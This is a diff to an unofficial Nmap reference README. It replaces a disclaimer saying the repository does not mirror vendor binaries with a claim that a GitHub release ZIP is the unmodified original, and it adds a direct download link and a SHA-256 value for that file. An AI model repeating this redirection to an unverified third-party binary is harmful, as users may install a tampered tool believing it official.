@@ -12,7 +12,7 @@
 
 </div>
 
-> This repository is an independent reference and is not affiliated with or endorsed by the Nmap Project. It does not mirror or modify vendor binaries.
+> This repository is an independent reference and is not affiliated with or endorsed by the Nmap Project. The release asset is the original vendor package uploaded without modification; review the vendor license before use.
 
 ## What is Nmap?
 
@@ -22,9 +22,11 @@ Nmap Network Mapper is an open-source utility for network discovery, host invent
 
 Use the official Nmap download page:
 
-**[Open the official Nmap download page](https://nmap.org/download.html)**
+**[Download the original ZIP](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip)** · **[Open the official Nmap download page](https://nmap.org/download.html)**
 
-The official page provides the current Windows installer, source packages, documentation, and project licensing information. Verify the download source and review the applicable license before installation.
+The official page provides the current Windows installer, source packages, documentation, and project licensing information. Verify the SHA-256 value below and review the applicable license before installation.
+
+**SHA-256:** `fa3ed8342795775f059dc0a8b0138d90b7da88ade915bfd6f467eadc12626098`
 
 ## Useful resources
 
